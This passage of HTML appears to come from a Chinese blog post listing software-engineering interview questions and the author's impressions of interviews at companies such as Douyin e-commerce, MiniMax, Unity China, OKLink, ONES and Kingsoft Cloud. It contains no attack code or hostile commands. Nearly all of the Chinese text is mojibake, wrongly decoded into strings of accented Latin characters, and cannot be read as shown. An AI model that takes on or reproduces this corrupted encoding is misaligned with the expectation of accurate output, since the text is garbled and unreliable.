ç»˜åˆ¶ã€äº¤æµèƒ½åŠ›ã€ä¸šåŠ¡äº†è§£èƒ½åŠ›</li></ul></li><li>é“¾è·¯è¿½è¸ªç³»ç»Ÿä»‹ç»<ul><li>å¦‚ä½•æŒ–æ˜é€»è¾‘æ¼æ´</li><li>æ•°æ®åº“çš„èº«ä»½ä¼ªé€ å¦‚ä½•æ£€æµ‹ï¼ˆï¼Ÿä¸æ˜¯ï¼‰</li><li>æ“ä½œç³»ç»Ÿæ€ä¹ˆå®ç°æƒé™è®¤è¯ï¼ˆï¼Ÿè´¦å·å¯†ç ã€ç”¨æˆ·ã€ç”¨æˆ·ç»„ï¼‰</li></ul></li><li>MySQL å¹¶å‘é—®é¢˜ã€éš”ç¦»çº§åˆ«ï¼ˆè§£å†³ä»€ä¹ˆé—®é¢˜ã€å¦‚ä½•è§£å†³ï¼‰</li><li>å¾®ä¿¡è½¬è´¦çš„éš”ç¦»çº§åˆ«ï¼Œä¸ºä»€ä¹ˆï¼ŒSQL è¯­å¥æ€ä¹ˆå†™<ul><li><a href="https://www.rainng.com/database-tran-isolation/">æµ…è°ˆæ•°æ®åº“äº‹åŠ¡åŠå››ç§éš”ç¦»çº§åˆ« - é›¨å‡</a></li></ul></li><li>Java åƒåœ¾å›æ”¶ç®—æ³•ï¼ˆå¯è¾¾æ€§åˆ†æç®—æ³•ï¼Œæ ‡è®°æ¸…é™¤ã€å¤åˆ¶ã€æ ‡è®°æ•´ç†ï¼‰</li><li>ä»£ç ä¹ æƒ¯<ul><li>æ ¼å¼åŒ–ã€æµ‹è¯•è¦†ç›–ç‡ã€æˆç†Ÿæ¡†æ¶ï¼ˆé¿å…é‡å¤é€ è½®å­ï¼‰ã€æ³¨é‡Šä¸æ–‡æ¡£</li></ul></li><li>å¦‚ä½•å­¦ä¹ æ–°æŠ€æœ¯<ul><li>è°ƒç ”è®¾è®¡ã€å®˜æ–¹æ–‡æ¡£ä¸ç¤ºä¾‹ã€å…·ä½“çš„åº”ç”¨ä»£ç ã€å¼€æºç¤¾åŒºã€æœ‰ç»éªŒçš„å¼€å‘è€…</li></ul></li><li>åé—®ï¼šä¸šåŠ¡<ul><li>æŠ–éŸ³ç”µå•†-æœåŠ¡ä½“éªŒ</li><li>è‡ªæˆ‘å‘ç°é—®é¢˜ï¼ˆä¸šåŠ¡åŠŸèƒ½è¿­ä»£ï¼‰ï¼šæœºåˆ¶ï¼ˆè¯†åˆ«ã€è§£å†³ï¼‰</li><li>ä¸šåŠ¡å¼‚å¸¸ã€å”®åæŠ€æœ¯ã€å¢é‡ï¼ˆç”¨æˆ·ã€ä¿éšœï¼‰</li></ul></li></ol><p><strong>HR é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>èŒä¸šè§„åˆ’</li><li>è€ƒè™‘å…¬å¸çš„å“ªäº›æ–¹é¢ï¼ˆå‘å±•å‰æ™¯ï¼‰</li><li>å¯¹æŠ–éŸ³ç”µå•†çš„äº†è§£ï¼ˆä¾æ‰˜æŠ–éŸ³å¹³å°ã€ä¸æ·˜å®å¯¹æ¯”ã€å¿«é€Ÿå‘å±•ï¼‰</li><li>æ‰‹é‡Œçš„ offer æƒ…å†µ</li><li>å·¥ä½œåœ°ç‚¹å€¾å‘ï¼šåŒ—äº¬ã€ä¸Šæµ·</li><li>å†…æ¨ã€å·¥ä½œå¼ºåº¦ï¼šé€šè¿‡åŒå­¦æœ‹å‹æ—©æœ‰äº†è§£</li><li>å­¦ä¹ æˆç»©ã€æ’åç­‰</li><li>ä»‹ç»å…¨æ ˆé¡¹ç›®ï¼šèƒŒæ™¯ã€éœ€æ±‚ã€å®ç°ã€è§£å†³çš„é—®é¢˜</li><li>å®éªŒå®¤ç ”ç©¶æ–¹å‘ï¼šè½¯ä»¶å®‰å…¨å¼€å‘</li><li>è‡ªå·±çš„ä¼˜ç¼ºç‚¹</li><li>å–œæ¬¢å­¦ä¹ ï¼Œéƒ½å­¦å“ªäº›å†…å®¹ï¼šè®ºå›åˆ†äº«ã€ç¾¤ç»„åˆ†äº«ã€å¼€æºç¤¾åŒº</li><li>ä¹‹å‰é¢è¯•å®˜åé¦ˆå®Œå…¨ä¸äº†è§£ SQLï¼šæœ‰ç”¨ä½†æ˜¯ç›²å†™ä¸è®°å¾—ï¼Œå€¾å‘äºç»“åˆéœ€æ±‚ä¸æŠ€æœ¯æ–‡æ¡£å®ç°</li><li>æœ‰æ²¡æœ‰æŠ•ç™¾åº¦&#x2F;é˜¿é‡Œ&#x2F;è…¾è®¯</li><li>åé—®<ul><li>base åœ°ï¼šåŒ—äº¬</li><li>ç»“æœå¤šä¹…èƒ½å‡ºï¼šéœ€è¦å¯¹é½ã€å®¡æ‰¹</li></ul></li></ol><h2 id="MiniMax"><a href="#MiniMax" class="headerlink" title="MiniMax"></a>MiniMax</h2><p>é¢è¯•å®˜ä¸ä¼š Java å´éè¦å½“åœºæ‰¾ç‚¹ææ–™é—®ğŸ˜…</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>å…¨æ ˆé¡¹ç›®ä»‹ç»</li><li>ç®—æ³•ï¼šTrie æ ‘</li><li>TCP&#x2F;IPï¼šä¸‰æ¬¡æ¡æ‰‹ã€å››æ¬¡æŒ¥æ‰‹ï¼Œæµé‡æ§åˆ¶ã€æ‹¥å¡æ§åˆ¶ï¼ˆç®—æ³•ï¼‰</li><li>Javaï¼šHashMap åº•å±‚ï¼ŒArrayList ä¸ LinkedList æ¯”è¾ƒ</li><li>Redis æ•°æ®ç»“æ„åŠç”¨é€”ï¼Œåº•å±‚å®ç°ï¼Œå¤§ key é—®é¢˜</li><li>MySQL ä¸‰å¤§æ—¥å¿—ï¼Œç´¢å¼•ç»“æ„ï¼ˆB&#x2F;B+&#x2F;çº¢é»‘æ ‘&#x2F;å“ˆå¸Œï¼‰ï¼ŒMVCCï¼Œæ€§èƒ½ä¼˜åŒ–</li><li>åé—®<ul><li>æŠ€æœ¯æ ˆï¼šGolang</li><li>éƒ¨é—¨ï¼šå¯¹è¯ç³»ç»Ÿ&#x2F;AIç”Ÿæˆï¼ŒToCï¼ŒToBï¼ŒåŸºç¡€æ¶æ„ï¼Œç®—æ³•</li><li>äººæ•°ï¼šåŠ ä¸Šå®ä¹ ç”Ÿ 100 å¤šäºº</li><li>é¢è¯•ï¼šä¸€å‘¨å‡ºç»“æœï¼Œè‡³å°‘ 3 è½®æŠ€æœ¯</li></ul></li></ol><h2 id="Unity-ä¸­å›½"><a href="#Unity-ä¸­å›½" class="headerlink" title="Unity ä¸­å›½"></a>Unity ä¸­å›½</h2><p>ç®€å†è´´äº† Github è´¦å·ï¼Œæ²¡æƒ³åˆ°ä¸¤ä½é¢è¯•å®˜éƒ½çœ‹äº† <a href="https://jckling.github.io/2022/05/20/Notes/23%20%E5%B1%8A%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/">23 å±Šæš‘æœŸå®ä¹ é¢è¯•æ€»ç»“</a>ï¼Œè¿˜éƒ½äº†è§£åˆ°æˆ‘ç© FF14ğŸ¤£</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>éƒ¨é—¨ä»‹ç»<ul><li>è§£å†³æ–¹æ¡ˆï¼ˆå®¢æˆ·éœ€æ±‚ï¼‰ï¼šå¼•æ“å®šåˆ¶ï¼ŒåŠŸèƒ½ã€æ€§èƒ½</li><li>å¼•æ“ç ”å‘ï¼šä¸­å›½ç‰ˆ</li><li>äº§å“ç ”å‘ã€äº‘æœåŠ¡ã€æŠ€æœ¯æ”¯æŒï¼šHubã€å°‘å„¿ç¼–ç¨‹ã€äº‘æ¡Œé¢ã€ç¤¾åŒº</li></ul></li><li>ä»‹ç» Java ç¨‹åºåˆ†æç³»ç»Ÿ<ul><li>ä»€ä¹ˆæ˜¯åˆ©ç”¨é“¾</li></ul></li><li>åšå¾—æ¯”è¾ƒè‡ªè±ªçš„ï¼šå…¨æ ˆé¡¹ç›®ï¼Œè®²è¿° Lambda ä¼˜åŒ–</li><li>JVM å†…å­˜åŒºåŸŸ</li><li>Java åƒåœ¾å›æ”¶ç®—æ³•</li><li>ç®—æ³•ï¼šåºåˆ—åŒ–å’Œååºåˆ—åŒ–äºŒå‰æ ‘</li><li>åé—®ï¼šæ˜¯å¦ä»‹æ„æ²¡æœ‰ã€ŒC++&#x2F;C#&#x2F;å›¾å½¢å­¦ã€åŸºç¡€</li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>ç®—æ³•ï¼šåœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾å…ƒç´ çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªä½ç½®</li><li>åœ¨äºšé©¬é€Šçš„å®ä¹ ä½“éªŒ</li><li>å¯¹åŒºå—é“¾çš„çœ‹æ³•</li><li>å‘å±•æ–¹å‘çš„è®¡åˆ’ï¼ˆå¼€å‘ï¼‰</li><li>Unity ä¸­å›½ï¼šç‹¬ç«‹ï¼Œç±»ä¼¼å¤–ä¼ï¼Œæ²¡æœ‰ 996ï¼Œæ›´å¤šå¯ä»¥é—® HR</li><li>æ–¹å‘ä»‹ç»<ul><li>å¸¸è§„ä¸šåŠ¡ï¼šå‰åç«¯ã€Hubã€äº‘</li><li>ä¸­å›½å¼•æ“å¼€å‘</li><li>æŠ€ç¾ï¼špackage</li><li>é¡¹ç›®ç»„ï¼šæ¸¸æˆå¼€å‘éœ€æ±‚ã€å¼•æ“å®šåˆ¶éœ€æ±‚</li><li>äººæœºäº¤äº’ï¼šè½¦è½½ï¼Œæ–°èƒ½æºæ±½è½¦ï¼ˆå°é¹ï¼‰</li><li>æ•°å­—å­ªç”Ÿã€å·¥ä¸šæ–¹å‘ã€å…ƒå®‡å®™</li></ul></li><li>åé—®ï¼šé¢è¯•å®˜æ˜¯åšä»€ä¹ˆçš„<ul><li>K12 ä¸­å­¦æ•™è‚²</li><li>å¼•æ“å®šåˆ¶</li><li>éŸ©å›½æ•™è‚²é›†å›¢åˆä½œ</li></ul></li></ol><p><strong>ä¸‰é¢</strong></p><ol><li>ä¸ºä»€ä¹ˆæƒ³æ¥ Unityï¼šå¤–ä¼ + ä¸Šæµ· + ç¦»å®¶è¿‘ + å‘å±•æœºé‡</li><li>èŒä¸šè§„åˆ’</li><li>å¯¹ Unity çš„äº†è§£</li><li>è§‰å¾—è‡ªå·±ä»£ç èƒ½åŠ›å¦‚ä½•<ul><li>ä»£ç æ ¼å¼åŒ–</li><li>æµ‹è¯•è¦†ç›–ç‡ 90%ï¼ˆé«˜æ ‡å‡†ï¼‰</li><li>çœ‹è¿‡å…¶ä»–äººçš„ä»£ç ï¼Œä¸å¤Ÿä¼˜é›…</li></ul></li><li>å¯¹ä»€ä¹ˆæ„Ÿå…´è¶£ï¼Œä¸ºä»€ä¹ˆ</li><li>å‰ç«¯&#x2F;å¼•æ“&#x2F;åç«¯<ul><li>ä¸ä¼šåƒäº’è”ç½‘é‚£ä¹ˆå¤§é‡çº§</li><li>åšå¾—æ¯”è¾ƒæ‚ï¼Œå•¥éƒ½ä¼šæ¥è§¦</li><li>æ²¡æœ‰å›¾å½¢å­¦åŸºç¡€ï¼ˆç°å­¦ C++&#x2F;C# å°±å¯ä»¥ï¼‰</li></ul></li><li>ä¼šå†™ CSS å—ï¼Œäº†è§£ <code>flexbox</code> å—</li><li>ä¸šåŠ¡<ul><li>äº‘ç¼–è¾‘å™¨</li><li>å…ƒå®‡å®™ï¼ˆè¯¾å ‚ã€åœºæ™¯ï¼‰</li><li>å¤šäººå¯¹æˆ˜ï¼ˆèµ„äº§åŠ é€Ÿã€æƒé™ç®¡ç†ï¼‰</li><li>Unity Hub</li></ul></li><li>åé—®<ul><li>å’Œä¸šåŠ¡ç»“åˆï¼šå…¨æ ˆ + å¼•æ“</li><li>è™šæ‹Ÿäººå‘å±•æ„¿æ™¯ï¼ˆåˆä½œï¼‰ï¼Œä¸»è¦æ˜¯ä¸ºäº†å¸®åŠ©å¼€å‘è€…</li></ul></li></ol><h2 id="æµªæ½®"><a href="#æµªæ½®" class="headerlink" title="æµªæ½®"></a>æµªæ½®</h2><p>ç‚¹å‡»å°±é€ï¼Œæ‰¹å‘ä»·ï¼Œå·²æ‹’ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>docker å¸¸ç”¨å†…å®¹ï¼šé•œåƒã€å®¹å™¨ã€ç½‘ç»œã€å·</li><li>docker å¦‚ä½•æŸ¥çœ‹æ—¥å¿—</li><li>æè¿°äºŒå‰æ ‘æ·±åº¦ä¼˜å…ˆéå†</li><li>æè¿°äºŒåˆ†æŸ¥æ‰¾</li></ol><h2 id="æ¬§ç§‘äº‘é“¾"><a href="#æ¬§ç§‘äº‘é“¾" class="headerlink" title="æ¬§ç§‘äº‘é“¾"></a>æ¬§ç§‘äº‘é“¾</h2><p>ç½‘ä¸Šè²Œä¼¼éƒ½è¯´åŒºå—é“¾å‰æ™¯ä¸æ˜æœ—ï¼Œé¢è¯•ä½“éªŒè‰¯å¥½ï¼Œå·²æ‹’ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>ä¸åŒç¼–ç¨‹è¯­è¨€ä¹‹é—´çš„å·®å¼‚ï¼Œä¸ºä»€ä¹ˆ C&#x2F;C++ å¿«</li><li>çº¿ç¨‹æ± æ‰§è¡Œè¿‡ç¨‹ã€ä¸ƒå¤§å‚æ•°</li><li>çº¿ç¨‹æ± é˜Ÿåˆ—æ¯”è¾ƒä¸é€‰æ‹©</li><li>hashCode ä¸ equals</li><li>synchronized ä¸ Lock æ¯”è¾ƒ</li><li>çº¿ç¨‹åŒæ­¥æ–¹å¼ï¼Œwait&#x2F;nofityã€park&#x2F;unpark</li><li>wait&#x2F;sleep çš„åŒºåˆ«</li><li>MySQL<ul><li>ç´¢å¼•æ•°æ®ç»“æ„æ¯”è¾ƒ</li><li>è”åˆç´¢å¼• <code>(a,b,c)</code> ä»¥ä¸‹è¯­å¥ <code>select * from table where a &gt; 10 and b &gt; 10</code> æ˜¯å¦ç”¨åˆ°ç´¢å¼•</li><li>è”åˆç´¢å¼• B+ æ ‘ä¸Šçš„å­˜å‚¨å†…å®¹</li><li>ä¸‰å¤§æ—¥å¿—åŠå…¶ä½œç”¨</li><li>MVCC å¦‚ä½•å®ç°</li><li>éš”ç¦»çº§åˆ«</li><li>å¦‚ä½•é˜²æ­¢å¹»è¯»</li></ul></li><li>ç³»ç»Ÿè®¾è®¡ï¼šç”µæ¢¯è°ƒåº¦ç³»ç»Ÿï¼ˆç”µæ¢¯ã€è°ƒåº¦ï¼‰</li><li>åé—®<ul><li>äº¤æ˜“æ‰€ï¼Œç±»ä¼¼åŒèŠ±é¡º</li><li>ç»„ç»‡æ¶æ„<ul><li>æƒé™éªŒè¯</li><li>å¹³å°ä¸šåŠ¡</li><li>ç­–ç•¥äº¤æ˜“</li><li>ç½‘å…³ï¼ˆé˜²ç«å¢™ã€å®‰å…¨ï¼‰</li><li>åŒºå—é“¾</li><li>åŸºç¡€æ¶æ„ï¼šå‹æµ‹ï¼ˆ4&#x2F;5äººï¼‰ã€ç¨³å®šæ€§ï¼ˆé“¾è·¯è¿½è¸ªï¼Œ6äººï¼‰ã€è„šæ‰‹æ¶</li></ul></li><li>è§„æ¨¡<ul><li>å…¬å¸ 2000+ï¼šäº§ç ”ã€éœ€æ±‚ã€æµ‹è¯•ç­‰</li><li>åŸºç¡€æ¶æ„ 70&#x2F;80+</li></ul></li></ul></li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>HashMap ä¸ TreeMap</li><li>çº¿ç¨‹çŠ¶æ€ï¼Œçº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹ä¼šåœ¨ä»€ä¹ˆçŠ¶æ€</li><li>å…³é—­è¿›ç¨‹æ—¶éœ€è¦æ‰§è¡Œ <code>shutdown</code> å—</li><li>æ•°æ®æµå­˜å‚¨-&gt;ä¼˜å…ˆé˜Ÿåˆ—-&gt;å †</li><li>å¦‚ä½•ä½¿ç”¨æ•°ç»„å®ç°å †</li><li>æ’åºç¨³å®šæ€§ï¼Œç¨³å®šæ’åºçš„åº”ç”¨</li><li>TIME_WAIT çŠ¶æ€</li><li>åŒºå—é“¾<ul><li>CAã€TLS</li><li>ç­¾å‘è¿‡ç¨‹ã€è®¤è¯è¿‡ç¨‹</li></ul></li><li>é“¾è·¯è¿½è¸ªç³»ç»Ÿ <ul><li>traceã€span ç­‰æ¦‚å¿µ</li><li>è·¨çº¿ç¨‹ä¼ é€’</li><li>jaeger æ¶æ„</li><li>æ•°æ®å¦‚ä½•å‘é€ï¼ˆRPCï¼‰</li><li>æ”¶é›†æ•°æ®å¦‚ä½•åšæ¼æ´æŒ–æ˜</li></ul></li><li>Java ç¨‹åºåˆ†æç³»ç»Ÿ<ul><li>ä½¿ç”¨ä»€ä¹ˆæ¡†æ¶å¼€å‘</li><li>æ”¶é›†ä»€ä¹ˆä¿¡æ¯</li><li>å¦‚ä½•åšéªŒè¯</li></ul></li></ol><p><strong>ä¸‰é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>å…¨æ ˆé¡¹ç›®ä»‹ç»<ul><li>å·¥ä½œå†…å®¹</li><li>ä¸ºä»€ä¹ˆé€‰ Redshiftï¼Œåº•å±‚ï¼ˆåŸºäº PostgreSQL å¼€å‘ï¼‰</li><li>å‰ç«¯ç›´æ¥ç»˜åˆ¶ï¼Œæˆ–ä½¿ç”¨ä»ªè¡¨æ¿å·¥å…· QuickSight</li></ul></li><li>è‹±æ–‡æ°´å¹³<ul><li>CET-6&#x2F;576</li><li>å®ä¹ æœŸé—´çš„è®¾è®¡æ–‡æ¡£ï¼Œé‚®ä»¶éƒ½æ˜¯è‹±æ–‡å†™çš„</li></ul></li><li>å¯¹åˆ†å¸ƒå¼åŠå…¬çš„çœ‹æ³•<ul><li>å®ä¹ æ—¶æ²¡å»è¿‡å…¬å¸ï¼Œå‚åŠ è¿‡å‡ æ¬¡å›¢å»º</li><li>å¯ä»¥çº¿ä¸Šè¯­éŸ³&#x2F;è§†é¢‘äº¤æµ</li></ul></li><li>æ˜¯å¦æŠ•é€’åŒ—äº¬å…¶ä»–å¤§å‚<ul><li>å¤–ä¼ï¼šæ’¤å‡ºã€å†»ç»“</li><li>ç™¾åº¦ï¼šä¸å–œæ¬¢å…¶äº§å“</li><li>äº¬ä¸œï¼šæ‰¾å®ä¹ çš„ä½“éªŒä¸å¥½ï¼Œå·¥ä½œåœ°ç‚¹å¤ªè¿œ</li><li>å­—èŠ‚ï¼šé¢è¯•çœ‹è¿æ°”</li></ul></li><li>å¯¹å…¬å¸çš„äº†è§£ï¼šWeb3ã€åŒºå—é“¾</li><li>åé—®<ul><li>ä¸šåŠ¡ï¼šæµ·å¤–ï¼ˆæ•°å­—è´§å¸ã€æŒç‰Œè´§å¸ï¼‰ã€å›½å†…ï¼ˆé“¾ä¸Šå¤§æ•°æ®æ²»ç†ï¼‰</li><li>åŸºæ¶ï¼šåŸºç¡€è®¾æ–½ã€å¾®æœåŠ¡ã€DevOpsã€k8sã€å®‰å…¨</li></ul></li></ol><p><strong>HR é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>ä¸ºä»€ä¹ˆä¸åšå®‰å…¨ï¼Œä¸ºä»€ä¹ˆæƒ³åˆ°åŒ—é‚®</li><li>Java ç¨‹åºåˆ†æç³»ç»Ÿ<ul><li>å·¥ä½œå†…å®¹ã€åˆ†å·¥&#x2F;åä½œã€äº¤æµæ¨¡å¼ã€å°ç»„è§„æ¨¡</li><li>ä¸æ˜¯ç›´æ¥å®‰æ’å…·ä½“è¯¾é¢˜ï¼Œè€Œæ˜¯è‡ªå·±é€‰å®šå’Œæ¢ç´¢</li><li>demo æ‰©å±•ä¸ºç³»ç»Ÿ</li></ul></li><li>å…¨æ ˆé¡¹ç›®<ul><li>å›¢é˜Ÿä»‹ç»ï¼ˆç›®æ ‡ï¼‰ã€å·¥ä½œå†…å®¹</li><li>æœ€å›°éš¾çš„åœ°æ–¹ï¼šæŒ‘æˆ˜ï¼Œæœ€è‡ªè±ªçš„ Lambda å‡½æ•°ä¼˜åŒ–</li><li>è¯´æœä»–äººã€å’Œäººäº¤æµ</li></ul></li><li>ä¸ºä»€ä¹ˆä¸æƒ³è´´è¿‘ä¸šåŠ¡ï¼šä¸æƒ³ç›´æ¥å’Œå¤–éƒ¨å®¢æˆ·æ‰“äº¤é“ï¼Œå†…éƒ¨ OK</li><li>å¯¹å…¬å¸çš„äº†è§£ï¼šä¸å¤ªäº†è§£ï¼Œåº”è¯¥ä¸æ˜¯ç°è‰²äº§ä¸š<ul><li>å›½å†…æ”¿ç­–ä¸æ˜æœ—ï¼Œä¸»è¦é¢å‘æµ·å¤–</li></ul></li><li>æ‰‹é‡Œçš„ offer æƒ…å†µ</li><li>åé—®<ul><li>åŒ—äº¬åŠå…¬æ¥¼ï¼Œmentor ä¸€èµ·æ¥</li><li>superNova åŸ¹è®­ï¼šä¸‰å¹´å†…åŸ¹å…»æˆå¤§ä½¬ï¼ˆç¡¬å®åŠ›ã€è½¯å®åŠ›ï¼‰</li><li>æ³•å®šå¸¦è–ªå¹´å‡+2ï¼Œæ¯å¹´+1</li><li>è¡¥è´´ï¼šå¥èº«5k1ã€å­¦ä¹ 6k8</li><li>å…è´¹æ™šé¤ä¸‹åˆèŒ¶æ°´æœï¼Œç”Ÿæ—¥ç¤¼é‡‘</li><li>base + ç»©æ•ˆå¹´ç»ˆï¼Œåº”å±Šç”Ÿä¸€ä¸ªæ± å­</li></ul></li></ol><h2 id="ONES"><a href="#ONES" class="headerlink" title="ONES"></a>ONES</h2><p>ä¸€å¤©ä¸‰è½®ï¼Œè¿‡äº†ç«‹é©¬æ¥åˆ°ç”µè¯çº¦ä¸‹ä¸€è½®ï¼Œä¸¤å‘¨åå‡ºç»“æœï¼Œå·²æ‹’ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>ä»‹ç»é“¾è·¯è¿½è¸ªç³»ç»Ÿï¼Œé‡åˆ°è¿‡ä»€ä¹ˆé—®é¢˜ã€å¦‚ä½•è§£å†³</li><li>å…¨æ ˆé¡¹ç›®é‡Œçš„æ•°æ®å¤„ç†ï¼šå¦‚ä½•åŒæ­¥ã€æ•°æ®å¦‚ä½•å¤„ç†ã€æ•ˆç‡é—®é¢˜</li><li>æ¥è§¦è¿‡çš„ç¼–ç¨‹è¯­è¨€ä¸å·¥å…·</li><li>å¹³æ—¶æ€ä¹ˆå…³æ³¨æ–°æŠ€æœ¯ï¼Œå¦‚ä½•å­¦ä¹ æ–°æŠ€æœ¯</li><li>å·¥ä½œé€‰æ‹©ï¼šç ”å‘ã€åœ°ç‚¹ã€ä¸šåŠ¡å‰æ™¯ã€è–ªé…¬ç¦åˆ©</li><li>åé—®<ul><li>ä¸šåŠ¡ï¼šSaaS</li><li>ç»„ç»‡è§„æ¨¡ï¼šç ”å‘ 300 å·¦å³</li><li>å‘å±•å‰æ™¯ï¼šåšåˆ°å›½å†… top1ï¼Œå‘å±•æµ·å¤–ä¸šåŠ¡</li><li>ä¸»è¦æŠ€æœ¯æ ˆï¼šgolangã€k8sã€ES&#x2F;MySQLã€Superset</li><li>é¢è¯•æµç¨‹ï¼šåŸºç¡€é¢ + ä¸»ç®¡é¢ + HR é¢</li></ul></li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>å…¨æ ˆé¡¹ç›®ï¼ˆç‹¬ç«‹ï¼‰ï¼Œå¦‚ä½•å¯¹æ¥éœ€æ±‚<ul><li>è®¾è®¡æ–‡æ¡£ï¼šMentor&#x2F;PMã€ç»„å†…æ±‡æŠ¥</li><li>å…·ä½“å®ç°ï¼šMentorã€ç¤¾åŒº</li></ul></li><li>Java ç¨‹åºåˆ†æç³»ç»Ÿï¼ˆåä½œï¼‰<ul><li>å¦‚ä½•åä½œï¼šåˆ†æ¨¡å—å¼€å‘</li><li>å¦‚ä½•æ¨è¿›ï¼šä¼šè®®</li></ul></li><li>Java ç¨‹åºåˆ†æç³»ç»Ÿå¦‚ä½•æ”¹è¿›ï¼šSpringã€å…¶ä»–æ¼æ´åˆ†æã€è¯­å¥çº§åˆ«åˆ†æã€è·¨è¯­è¨€åˆ†æ</li><li>å¦‚ä½•å­¦ä¹ æ–°æŠ€æœ¯ï¼šå®˜æ–¹ç¤ºä¾‹&#x2F;æ–‡æ¡£ã€å¼€æºé¡¹ç›®</li><li>å·¥ä½œé€‰æ‹©ï¼šåœ°ç‚¹ã€ç ”å‘ã€ä¸šåŠ¡ã€è–ªé…¬ç¦åˆ©</li><li>åé—®<ul><li>ä¸šåŠ¡ï¼šB ç«¯ç³»ç»Ÿï¼ˆå›½å†…&#x2F;å›½å¤–ï¼‰</li><li>è§„æ¨¡ï¼šå…¬å¸ 600+ äººï¼ŒæŒ‰æ¨¡å—å‚ç›´åˆ’åˆ†ï¼Œå»å¹´ä»Šå¹´æ‹›äºº</li><li>æ–°äººåŸ¹è®­æœºåˆ¶ï¼šå¯¼å¸ˆåˆ¶ã€åŠä¸ªæœˆè¯¾ç¨‹åŸ¹è®­ã€1-3 æœˆå­¦ä¹ æœŸã€3-5 æœˆæ¥æ‰‹ä»»åŠ¡</li></ul></li></ol><p><strong>HR é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>å¯¹å…¬å¸çš„äº†è§£<ul><li>SaaSï¼Œä¼ä¸šè§£å†³æ–¹æ¡ˆ</li><li>ç›®æ ‡ï¼šå›½å†… top1ï¼Œå¼€æ‹“å›½å¤–å¸‚åœº</li><li>éƒ¨é—¨å‚ç›´åˆ’åˆ†</li><li>æŠ€æœ¯æ ˆ golang + k8s</li><li>æ–°äººåŸ¹è®­æœºåˆ¶</li></ul></li><li>ä»‹ç»æœ€æœ‰æŒ‘æˆ˜æ€§ã€æˆå°±æ„Ÿçš„é¡¹ç›®ç»å†ï¼ˆå…¨æ ˆé¡¹ç›®ï¼‰</li><li>å·¥ä½œé€‰æ‹©ï¼šåœ°ç‚¹ã€ç ”å‘ã€ä¸šåŠ¡ã€è–ªé…¬ç¦åˆ©</li><li>ä¸€åˆ°ä¸‰å¹´çš„èŒä¸šè§„åˆ’</li><li>æ‰‹å¤´æœ‰ä»€ä¹ˆ offer</li><li>åé—®ï¼šå¤§çº¦ 1-2 å‘¨å‡ºç»“æœ</li></ol><h2 id="é‡‘å±±äº‘"><a href="#é‡‘å±±äº‘" class="headerlink" title="é‡‘å±±äº‘"></a>é‡‘å±±äº‘</h2><p>é¢è¯•ä½“éªŒä¸€èˆ¬ï¼ŒåŒ—äº¬çš„å·¥ä½œåœ°ç‚¹åœ¨å°ç±³ç§‘æŠ€å›­å†…ï¼Œå·²æ‹’ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>ç®—æ³•ï¼šå½’å¹¶æ’åº</li><li>synchronized ä¸ Lock åŒºåˆ«</li><li>çº¿ç¨‹çŠ¶æ€</li><li>å¦‚ä½•æŸ¥çœ‹çº¿ç¨‹çŠ¶æ€</li><li>JVM å†…å­˜ç»“æ„</li><li>NIOï¼ˆä¸ä¼šï¼‰</li><li>volatile å…³é”®å­—</li><li>çº¿ç¨‹æ± ä¸ƒå¤§å‚æ•°</li><li>åˆ›å»ºçº¿ç¨‹çš„æ–¹å¼</li><li>æ˜¯å¦æ¥å—æ­¦æ±‰</li><li>åé—®<ul><li>éƒ¨é—¨ï¼šå¤§æ•°æ®</li><li>æ‹›è˜ï¼šå¤§æ•°æ®ã€Javaï¼ˆSpring Bootã€Spring Cloudï¼‰</li></ul></li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>ä»‹ç» Java ç¨‹åºåˆ†æç³»ç»Ÿ</li><li>Hash ç»“æ„ï¼Œå¦‚ä½•è§£å†³å†²çªï¼ŒHashMap åº•å±‚å®ç°ã€å¦‚ä½•æ‰©å®¹</li><li>è°ƒåº¦ç®—æ³•</li><li>é¡µé¢ç½®æ¢ç®—æ³•</li><li>OSI å‚è€ƒæ¨¡å‹ï¼ˆ7 å±‚ï¼‰</li><li>ç”¨è¿‡ ping å—</li><li>å¸¸ç”¨ Linux æŒ‡ä»¤</li><li>æŸ¥çœ‹ç½‘ç»œè¿æ¥æƒ…å†µï¼ˆnetstatï¼‰</li><li>equals å’Œ hashCode çš„å…³ç³»</li><li>ConcurrentHashMap åº•å±‚å®ç°</li><li>HashSet å’Œ HashMap çš„å…³ç³»</li><li>å †å†…å­˜åˆ’åˆ†æ–¹å¼ï¼ˆåƒåœ¾å›æ”¶ï¼‰</li><li>åé—®<ul><li>åœ°ç‚¹ï¼šä¸»è¦æ˜¯æ­¦æ±‰ã€å¦é—¨ï¼Œæœ¬éƒ¨åœ¨åŒ—äº¬</li><li>éƒ¨é—¨&#x2F;ä¸šåŠ¡ï¼šå­˜å‚¨ã€ç½‘ç»œã€CDNã€è®¡ç®—ç­‰</li><li>åˆ†é…ï¼šåŒå‘é€‰æ‹©</li></ul></li></ol><h2 id="Flexport"><a href="#Flexport" class="headerlink" 